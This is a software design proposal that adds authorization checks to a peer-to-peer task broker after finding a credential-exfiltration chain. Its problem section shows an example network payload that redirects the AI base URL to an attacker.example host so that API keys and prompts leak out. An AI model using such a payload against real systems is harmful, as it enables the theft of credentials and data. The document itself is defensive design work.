# Skill Authorization — Design Proposal

Status: proposed (implemented in minimal form, see "Current state" below)

## Problem

`TaskBroker.handle()` makes no distinction between a task invoked *locally*
(by core or a plugin on the same node) and a task received *over the network*
(via `wireNetworkToBroker`). Because `wireNetworkToBroker` routes every inbound
task straight to `broker.handle()`, **every registered skill is reachable by
any peer on the mDNS subnet the moment a network provider is wired in**.

Concrete exfiltration chain (the one that motivated this document):

1. `CoreAIProvider` reads `ai.apiKey`, `ai.baseUrl`, `ai.model` from the vault
   — a free, unrestricted key namespace.
2. The `vault` plugin registers `vault.setSecret`, which accepts *any* key,
   including `ai.baseUrl`.
3. `wireNetworkToBroker` forwards inbound network tasks to `broker.handle()`
   with no authorization check.

Result: a peer that discovers this node can send
`{ skill: "vault.setSecret", payload: { key: "ai.baseUrl", value: "https://attacker.example/v1" } }`.
The next `ctx.ai.generateText(...)` call then ships the (still valid) API key
and every prompt to the attacker. No encryption bug, no sandbox escape — just
the intended, tested functionality used exactly as designed.

## Threat model

- **Peers are untrusted.** Discovery is multicast/broadcast; any process on the
  LAN can claim to be a peer and can send a task.
- **Peers are not yet authenticated.** There is no peer identity, signing, or
  pairing in this stage. Any authorization model must therefore *not* rely on
  knowing *who* sent a task; it can only rely on the *origin channel*
  (local vs. network).
- **Skills are capability-bearing.** A skill that mutates secrets or config is
  a capability. Local-only skills must never be reachable over the wire.

## Principles

1. **Deny by default.** A skill is local-only unless a plugin explicitly opts
   it in to remote invocation (`localOnly: false`).
2. **Origin is a channel property, not a caller property.** For now, the only
   axis we can trust is *where the task entered*: local (`broker.handle`) or
   network (`broker.handleRemote`). We do not attempt to authenticate peers in
   this stage.
3. **Reserved namespaces are enforced structurally.** Sensitive key namespaces
   (currently `ai.*`) are blocked at the plugin-facing `VaultContext` boundary,
   so no plugin can write them regardless of how its skills are wired.
4. **The broker never throws to the network.** Authorization failures are
   ordinary `status: "error"` `TaskResult`s, matching the existing contract.

## Design

### `localOnly` flag on skill registration

```ts
broker.registerSkill("calendar.listEvents", handler, { localOnly: false });
broker.registerSkill("vault.setSecret", handler, { localOnly: true }); // default
```

- Default is `localOnly: true`.
- `SkillContext.register(name, handler, options?)` forwards the flag, so
  plugins opt in/out at their own registration sites.
- `localOnly: false` requires a matching manifest permission
  `network:skill:<pluginId>.<skillName>`; the loader throws at `activate()`
  time if it is missing (mirroring the cross-namespace filter check). There is
  no silent fallback to `localOnly: true` — a plugin author who intends to
  expose a skill must say so in the manifest, and a mis-wired manifest fails
  loudly.

### Split handle path

```ts
broker.handle(task)        // local callers — full access
broker.handleRemote(task)   // network callers — authorization enforced
```

- `wireNetworkToBroker` now calls `handleRemote`.
- `handleRemote` rejects a `localOnly` skill with
  `status: "error"` and a clear message; it never throws.

### Reserved key namespaces

- `VaultContext` (the plugin-facing surface) rejects `setSecret`/`deleteSecret`
  for any key whose prefix is in `VaultManager.reservedPrefixes` and filters
  those keys out of `listSecretKeys`. The list defaults to `["ai."]` but is
  configurable, so a future wallet or identity-key namespace can be reserved
  the same way instead of via a one-off patch.
- Raw reads/writes of reserved keys stay confined to core (`VaultManager` +
  `CoreAIProvider`), to be managed later by a local settings flow that calls
  `VaultManager` directly — never through the broker.

## What this fixes / does not fix

Fixed now:

- Network peers can no longer reach `vault.*` (or any local-only skill).
- No plugin can write reserved namespaces (default `ai.*`) through
  `ctx.vault`.
- Exposing a skill (`localOnly: false`) requires an explicit manifest
  permission.

Deferred (requires peer identity / network-layer work, out of scope here):

- **Advertisement filtering.** `NetworkLightProvider` still advertises skills
  from its constructor argument; it does not know about `localOnly`. Today a
  local-only skill that is (mis)advertised is still *rejected* at the broker,
  so the gap is safe-by-default, but it also leaks the existence of internal
  skills to every LAN listener. Advertising only non-local skills is the
  follow-up for the next network-related stage.
- **Per-peer allowlists / ACLs.** Once peers have stable, signed identities,
  `handleRemote` can grow an ACL (`skill x peerId`) instead of a single
  global `localOnly` bit.
- **Capability tokens.** For cross-node delegation, a peer could present a
  short-lived, scoped token rather than a bare skill name.

## Open questions

1. ~~Should `localOnly: false` require an explicit manifest `permissions` entry?~~
   **Decided: yes** — `network:skill:<pluginId>.<name>` is required and enforced
   at `activate()` time.
2. How should a peer discover *which* skills are actually remote-invokable?
   Options: a broker query method (`broker.remoteSkills()`), or fold it into
   the provider contract.

## Current state

- `localOnly` (deny-by-default) and `handleRemote` are implemented.
- `wireNetworkToBroker` uses `handleRemote`.
- Reserved namespaces (default `ai.*`) are enforced at the `VaultContext`
  boundary via a configurable `reservedPrefixes` list on `VaultManager`.
- `localOnly: false` requires the `network:skill:<pluginId>.<name>` permission.
- `calendar.listEvents` is opted in (`localOnly: false` + permission);
  `vault.*` stays local.
